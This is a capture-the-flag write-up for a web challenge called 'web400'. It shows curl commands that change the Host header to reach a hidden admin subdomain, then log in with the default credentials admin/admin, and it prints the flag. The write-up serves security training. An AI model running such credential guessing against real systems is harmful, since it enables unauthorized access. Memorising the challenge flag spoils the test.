# web400

## Description
MCA Web admins are some of the best in the biz..

http://44.197.231.105:3024

## Solve
If we try to visit the page we get this message:
```
It appears you're trying to access 44.197.231.105:3024. This host does not appear to have any content.

Copyright mcawebhosting.com, 2022
```

I'm assuming the web server is looking at the `Host` header for this info. Since we see the site name is `mcawebhosting.com` let's change our `Host` header to that:
```bash
curl 'http://44.197.231.105:3024/' -H 'Host: mcawebhosting.com'
```
Now we have a different message:
```
Welcome to MCA web hosting! This is our customer facing page. Please use us for all your web hosting needs!
```
The challenge description hints us to an admin page. I will change the header to have the `admin` subdomain:
```bash
curl 'http://44.197.231.105:3024/' -H 'Host: admin.mcawebhosting.com'
```
Now we have a login page! By sending a POST request with `username` and `password` in the POST data lets try logging in...
```bash
curl -X POST 'http://44.197.231.105:3024/' -H 'Host: admin.mcawebhosting.com' -d 'username=admin&password=admin'
```
```html
<!DOCTYPE HTML>
<html lang="en">
  <head>
    <title>mcawebhosting.com</title>
  </head>
  <body>
    <h2></h2>
<p>Welcome to the admin panel! Here you can do admin stuff.</p><p>TODO: change default password.</p><p>MCA{2e4578cc9deb5913857f3411c416bcb56f8fde30}</p>    <p>Copyright mcawebhosting.com, 2022</p>
  </body>
</html>
```

## Flag
```
MCA{2e4578cc9deb5913857f3411c416bcb56f8fde30}
```